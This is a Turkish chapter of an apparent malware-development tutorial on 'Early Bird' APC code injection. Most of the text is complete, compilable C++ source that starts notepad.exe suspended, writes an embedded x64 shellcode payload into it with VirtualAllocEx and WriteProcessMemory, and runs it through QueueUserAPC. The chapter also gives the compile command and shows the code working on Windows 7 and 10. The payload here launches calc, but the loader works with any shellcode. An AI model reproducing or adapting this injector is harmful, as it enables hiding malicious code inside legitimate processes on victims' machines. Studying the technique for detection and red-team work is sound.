\newpage
\subsection{13. APC enjeksiyon tekniği. Basit C++ zararlı yazılım}

﷽

![APC injection](./images/21/2021-11-11_14-32.png){width="80%"}

Önceki bölümlerde, klasik kod enjeksiyonunu ve klasik DLL enjeksiyonunu yazmıştım.     

Bugün bu bölümde, "Early Bird" APC enjeksiyon tekniğini ele alacağım. Bugün, belirli bir iş parçacığını sıraya almak için asenkron prosedür çağrısından faydalanan [QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)'ye bakacağız.

Her iş parçacığının kendi APC kuyruğu vardır. Bir uygulama, QueueUserAPC işlevini çağırarak bir APC'yi bir iş parçacığına sıraya alır. Çağrı yapan iş parçacığı, QueueUserAPC çağrısında bir APC işlevinin adresini belirtir. Bir APC'nin sıraya alınması, iş parçacığının APC işlevini çağırması için bir istektir.    

Bu tekniğin yüksek seviyede genel bir özeti şu şekildedir:    
Öncelikle, zararlı programımız yeni bir meşru süreç oluşturur (bizim durumumuzda `notepad.exe`):   

![APC 1](./images/21/apc-1.png){width="80%"}          

![APC injection 2](./images/21/2021-11-11_15-09.png){width="80%"}    

`CreateProcess` çağrısını her gördüğümüzde, dikkat etmek isteyeceğimiz iki önemli parametre vardır: birincisi (çağrılacak yürütülebilir dosya) ve altıncısı (süreç oluşturma bayrakları). Oluşturma bayrağı `CREATE_SUSPENDED` olarak ayarlanmıştır.     

Daha sonra, payload için bellek, yeni oluşturulan sürecin bellek alanında tahsis edilir:

![APC 2](./images/21/apc-2.png){width="80%"}    

![APC injection 3](./images/21/2021-11-11_15-12.png){width="80%"}    

Daha önceki yazılarımda belirttiğim gibi, `VirtualAlloc` ve `VirtualAllocEx` arasında çok önemli bir fark vardır. İlki, çağrı yapan sürecin belleğinde bellek tahsis ederken, ikincisi uzak bir süreçte bellek tahsis eder. Yani, eğer zararlı yazılımın `VirtualAllocEx` çağrısı yaptığını görürsek, büyük olasılıkla bir tür süreçler arası etkinlik başlamış olacaktır.

Kabuk koduna işaret eden [APC](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) rutini tanımlanır.     
Ardından payload, tahsis edilen belleğe yazılır:      

![APC 3](./images/21/apc-3.png){width="80%"}         

APC, şu anda askıya alınmış durumda olan ana iş parçacığına sıraya alınır:     

![APC 4](./images/21/apc-4.png){width="80%"}    

![APC injection 4](./images/21/2021-11-11_15-13.png){width="80%"}    

Son olarak, iş parçacığı devam ettirilir ve yükümüz çalıştırılır:    

![APC 5](./images/21/apc-5.png){width="80%"}    

![APC injection 5](./images/21/2021-11-11_15-14.png){width="80%"}    

Yani, tam kaynak kodumuz şu şekilde (`evil.cpp`):

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// our payload calc.exe
unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 
  0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 
  0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
  0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 
  0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
  0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
  0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 
  0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 
  0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 
  0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
  0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
  0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 
  0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 
  0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 
  0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 
  0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 
  0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 
  0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
  0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

int main() {

  // Create a 64-bit process:
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  LPVOID my_payload_mem;
  SIZE_T my_payload_len = sizeof(my_payload);
  LPCWSTR cmd;
  HANDLE hProcess, hThread;
  NTSTATUS status;

  ZeroMemory(&si, sizeof(si));
  ZeroMemory(&pi, sizeof(pi));
  si.cb = sizeof(si);

  CreateProcessA(
    "C:\\Windows\\System32\\notepad.exe",
    NULL, NULL, NULL, false,
    CREATE_SUSPENDED, NULL, NULL, &si, &pi
  );
  WaitForSingleObject(pi.hProcess, 5000);
  hProcess = pi.hProcess;
  hThread = pi.hThread;

  // allocate a memory buffer for payload
  my_payload_mem = VirtualAllocEx(hProcess, NULL, my_payload_len,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // write payload to allocated buffer
  WriteProcessMemory(hProcess, 
  my_payload_mem, 
  my_payload, 
  my_payload_len, NULL);

  // inject into the suspended thread.
  PTHREAD_START_ROUTINE apc_r = (PTHREAD_START_ROUTINE)my_payload_mem;
  QueueUserAPC((PAPCFUNC)apc_r, hThread, NULL);

  // resume to suspended thread
  ResumeThread(hThread);

  return 0;
}
```

Gördüğünüz gibi, basitlik adına payload olarak 64-bit `calc.exe` kullanıyoruz. Payload oluşturulması detaylarına girmeden, payload’ı doğrudan kodumuza yerleştireceğiz:      

```cpp
unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 
  0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 
  0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
  0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 
  0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
  0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
  0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 
  0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 
  0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 
  0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
  0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
  0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 
  0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 
  0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 
  0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 
  0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 
  0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 
  0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
  0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
```

Derlemeyi başlayalım:   

```bash
x86_64-w64-mingw32-gcc evil.cpp -o evil.exe -s \
-ffunction-sections -fdata-sections -Wno-write-strings \ 
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc
```

![APC injection 6](./images/21/2021-11-11_15-18.png){width="80%"}    

Hadi, `Windows 7 x64` üzerinde `evil.exe`'yi başlatalım:    

![APC injection 7](./images/21/2021-11-11_15-24.png){width="80%"}    

Process Hacker ile yeni başlatılan `notepad.exe`'yi kontrol edersek, ana iş parçacığının gerçekten askıya alınmış durumda olduğunu doğrulayabiliriz:     

![APC injection 8](./images/21/2021-11-11_15-51.png){width="80%"}    

> Gördüğünüz gibi, `WaitForSingleObject` işlevinin ikinci parametresi, gösterim amacıyla `30000` olarak ayarlandı; gerçek dünya senaryosunda bu kadar büyük olmayabilir.

Ayrıca, `evil.exe`'miz `Windows 10 x64` üzerinde de çalıştı:    

![APC injection 9](./images/21/2021-11-11_14-29.png){width="80%"}    

[APC MSDN](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)         
[QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)          
[VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)   
[WaitForSingleObject](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)        
[WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)      
[ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)     
[ZeroMemory](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366920(v=vs.85))            
[Github'taki kaynak kod:](https://github.com/cocomelonc/2021-11-11-malware-injection-3)         

Gelecekte, daha gelişmiş kod enjeksiyon tekniklerini anlamaya çalışacağım.     

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.    